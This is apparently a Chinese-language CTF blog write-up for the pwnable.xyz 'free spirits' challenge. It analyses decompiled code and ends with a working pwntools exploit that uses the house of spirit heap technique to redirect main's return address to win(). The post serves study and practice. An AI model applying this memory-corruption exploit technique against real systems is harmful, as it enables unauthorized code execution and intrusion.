---
title: pwnable-free-spirits
date: 2019-12-18 15:29:58
tags: 
- pwn
- pwnable.xyz
---

# pwnable.xyz free spirits

### 0x0 知识准备

这道题涉及到了新的知识盲区（打算拿这个网站的题入门来着，之前并没学过PWN，所以要补充的知识很多）

这次用到了一个惯用方法：house of spirit

涉及到内存中`malloc` 和`free`函数的具体实现。具体的知识我就不在这里细说了，有兴趣的可以参考下面的文章：

[CTF pwn 中最通俗易懂的堆入坑指南](https://bbs.ichunqiu.com/thread-47938-1-1.html)

[二进制安全之堆溢出（系列）—— house of spirit](https://zhuanlan.zhihu.com/p/78304033)

### 0x1 分析

老样子，看一下开启的保护：

![](https://i.loli.net/2019/12/18/HE2sIlnF3cKMGQ7.png)

看起来可以从实际的地址入手。

接下来，分析一下源代码吧

`main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  signed __int64 i; // rcx
  int v5; // eax
  __int64 v7; // [rsp+8h] [rbp-60h]
  char *buf; // [rsp+10h] [rbp-58h]
  char nptr; // [rsp+18h] [rbp-50h]
  unsigned __int64 v10; // [rsp+48h] [rbp-20h]

  v10 = __readfsqword(0x28u);
  setup(*(_QWORD *)&argc, argv, envp);
  buf = (char *)malloc(0x40uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      _printf_chk(1LL, "> ");
      v3 = &nptr;
      for ( i = 12LL; i; --i )
      {
        *(_DWORD *)v3 = 0;
        v3 += 4;
      }
      read(0, &nptr, 0x30uLL);
      v5 = atoi(&nptr);
      if ( v5 != 1 )
        break;
      __asm { syscall; LINUX - sys_read }
    }
    if ( v5 <= 1 )
      break;
    if ( v5 == 2 )
    {
      _printf_chk(1LL, "%p\n");
    }
    else if ( v5 == 3 )
    {
      if ( (unsigned int)limit <= 1 )
        _mm_storeu_si128((__m128i *)&v7, _mm_loadu_si128((const __m128i *)buf));
    }
    else
    {
LABEL_16:
      puts("Invalid");
    }
  }
  if ( v5 )
    goto LABEL_16;
  if ( !buf )
    exit(1);
  free(buf);
  return 0;
```

`win()`函数从来都是老样子：

```c
int win()
{//0x400a3e
  return system("cat /flag");
}
```

那就具体分析一下`main()`函数吧

​	`while`循环内好像是一个菜单。

当`nptr`读入`1`的时候，可以读入`16`个字节到`buf`指向的地址:

```assembly
0x400849:   48 8b 74 24 10               	mov rsi, qword ptr [rsp + 0x10]
0x40084e:   48 31 c0                     	xor rax, rax
0x400851:   48 31 ff                     	xor rdi, rdi
0x400854:   48 c7 c2 20 00 00 00         	mov rdx, 0x20
0x40085b:   0f 05                        	syscall 
```

当`nptr`读入`2`的时候，打印`buf`变量的地址（并不是`buf`指向的地址，而是其本身的地址）：

```assembly
0x4007df:   4c 8d 64 24 10               	lea r12, [rsp + 0x10]           #buf

0x40085f:   48 8d 35 7b 02 00 00         	lea rsi, [rip + 0x27b]
0x400866:   4c 89 e2                     	mov rdx, r12
0x400869:   bf 01 00 00 00               	mov edi, 1
0x40086e:   31 c0                        	xor eax, eax
0x400870:   e8 2b ff ff ff               	call 0x4007a0 <__printf_chk>
```

当`nptr`读入`3`的时候，从`v7`的地址开始存`16`字节的内容，内容来自`buf`指向的地址中的内容。

但是注意这里，`v7`和`buf`的位置只相差`8`个字节距离，所以这里也许尝试去覆盖`buf`的内容，达到修改`buf`指针的作用。

当`nptr`读入其他值的时候，退出`while`循环。

退出循环后，会`free`掉`buf`指向地址的内容。

### 0x3 思路

说实话，这道题我是根本没有思路，看过了一个师傅的write up之后才知道了house of spirit的方法。其中一度在`free`和`malloc`的原理上卡壳。

废话少说，我们看这道题的flag 怎么拿。

由于进入`菜单3`我们可以修改`buf`指向的位置，另外`菜单1`这里我们写入`buf`指向的地址内容。因此我们可以尝试通过在`buf`指向的地址写入我们需要覆盖内容的地址来修改我们需要覆盖内容的地址的数据，而且我们从`菜单2`中得到的地址是程序中的实际地址，这里有点绕口，可以看之后的代码辅助理解一下。

所以我们可以尝试通过修改`main()`函数的返回地址中的内容为`win()`函数的起始地址来调用`win()`函数拿到flag。

所以我们首先得到`buf`的地址，通过偏移量算出来返回地址。然后通过上述的操作即可修改返回地址中内容为`win()`的起始地址。

但是注意，我们做到这里之后，`buf`的地址指向的必然是返回地址，这时候退出循环触发`free()`函数时候，清理掉的内容也正是返回地址的内容，我们的之前工作都白费，而且还会异常退出。

那么这个时候处理`free()`函数就用到了house of spirit。

我们预想到了会在`free`这里出岔子。那么我们让`free()`函数不去清理返回地址不就好了。我们通过创建伪造的malloc_chunk来让`free()`别打扰我们的返回地址。

我暂时认为，我们只要在一个不相关的地址在制造伪块，并且大小和原来一样就OK。那就选择在`.bss`区来创建好了。地址是`0x601030`。大小将会设置为`0x51`。

### 0x4 代码

```python
from pwn import *

context.log_level = 'debug'
# p = process("./challenge")
p = remote("svc.pwnable.xyz", 30005)
elf = ELF('./challenge')

win_addr = elf.symbols['win']
chunk_addr = 0x601030

p.sendafter('> ', '2')
buf = int(p.recvuntil("\n"), 16)
ret = buf + 0x58

p.sendafter('> ', '1')
payload = 'A' * 8 + p64(ret)
p.sendline(payload)
p.sendafter('> ', '3')

p.sendafter('> ', '1')
payload = p64(win_addr) + p64(chunk_addr + 0x8)
p.sendline(payload)
p.sendafter('> ', '3')

p.sendafter('> ', '1')
payload = p64(0x51) + p64(chunk_addr + 0x58)
p.sendline(payload)
p.sendafter('> ', '3')

p.sendafter('> ', '1')
payload = p64(0x21) + p64(chunk_addr + 0x10)
p.sendline(payload)
p.sendafter('> ', '3')

p.sendafter('> ', 'a')
p.interactive()
```

### 0x5 结果

![](https://i.loli.net/2019/12/18/qjXMQAGLd9zCJli.png)